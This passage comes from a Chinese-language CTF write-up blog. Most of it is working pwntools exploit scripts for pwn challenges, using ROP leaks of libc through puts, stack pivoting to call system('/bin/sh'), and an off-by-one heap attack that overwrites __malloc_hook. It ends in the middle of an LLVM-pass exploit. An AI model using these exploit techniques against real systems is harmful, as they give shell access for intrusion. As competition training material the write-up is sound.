punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401296</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'functions?'</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x404a28</span> <span class="token operator">+</span> <span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401258</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basebin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="magicread"><a href="#magicread" class="headerlink" title="magicread"></a>magicread</h3><p>栈迁移</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">40862</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>bss <span class="token operator">=</span> <span class="token number">0x601a00</span>read <span class="token operator">=</span> <span class="token number">0x400675</span>start <span class="token operator">=</span> <span class="token number">0x400510</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400723</span>leave_ret <span class="token operator">=</span> <span class="token number">0x0000000000400691</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23_11.3/libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>bin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="round3"><a href="#round3" class="headerlink" title="round3"></a>round3</h2><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>直接<code>nc</code>连接输入<code>SuperSecretPassword</code></p><h3 id="ezstack3"><a href="#ezstack3" class="headerlink" title="ezstack3"></a>ezstack3</h3><p>栈迁移</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">32404</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'stack3'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shell <span class="token operator">=</span> <span class="token number">0x8049347</span>addr <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x40</span>bin_sh <span class="token operator">=</span> addr <span class="token operator">+</span> <span class="token number">0x28</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08049185</span>p <span class="token operator">=</span> p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>shell<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="null"><a href="#null" class="headerlink" title="null"></a>null</h3><p><code>off-by-one</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">37786</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebda0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseogg <span class="token operator">=</span> <span class="token number">0x10a2fc</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> <span class="token string">b'\x61'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span>edit<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="show-me-the-code"><a href="#show-me-the-code" class="headerlink" title="show_me_the_code"></a>show_me_the_code</h3><p><code>llvm</code>，用<code>c++</code>写<code>exp</code>，由于<code>opt-12</code>保护机制是<code>no pie</code>所以可以获取其中的<code>got</code>表里的<code>libc</code>地址，直接打<code>system(&#39;sh&#39;)</code></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">edoc</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">addi</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                                 <span class="token comment">//regs[x] = y + z                                                       x &lt;= 5</span>    <span class="token keyword">void</span> <span class="token function">chgr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                                        <span class="token comment">//regs[x] += y                                                          x &lt;= 5                  -0x1000 &lt; y &lt; 0x1000    onetime</span>    <span class="token keyword">void</span> <span class="token function">sftr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">bool</span> y<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                      <span class="token comment">//y = 1 : regs[x] &lt;&lt; z;         y = 0 : regs[x] >> z                    x &lt;= 5  y &lt; 0x40</span>    <span class="token keyword">void</span> <span class="token function">borr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> y<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>             <span class="token comment">//regs[x] = regs[y] | regs[z]                                           x &lt;= 5  y &lt;= 5  z &lt;= 5</span>    <span class="token keyword">void</span> <span class="token function">movr</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                              <span class="token comment">//regs[x] = regs[y]                                                     x &lt; 8  y &lt; 8</span>    <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span>  y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                              <span class="token comment">//*(y+regs[6]) = regs[x]                                                x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span>    <span class="token keyword">void</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                               <span class="token comment">//regs[x] = *(y+regs[6])                                                x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span>    <span class="token keyword">void</span> <span class="token function">runc</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span>  y<span class="token 